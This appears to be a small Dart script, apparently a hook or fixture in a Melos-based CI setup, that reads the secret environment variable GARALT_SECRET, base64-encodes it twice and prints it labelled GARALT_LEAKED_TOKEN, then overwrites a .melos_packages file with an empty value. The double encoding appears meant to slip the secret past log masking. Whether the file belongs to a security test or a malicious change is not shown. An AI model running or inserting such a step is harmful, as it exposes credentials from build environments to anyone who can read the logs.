import 'dart:io';
void main() {
  var result = Process.runSync('bash', ['-c', r'echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"']);
  print(result.stdout.toString().trim());
  File('.melos_packages').writeAsStringSync('MELOS_PACKAGES=');
  exit(0);
}
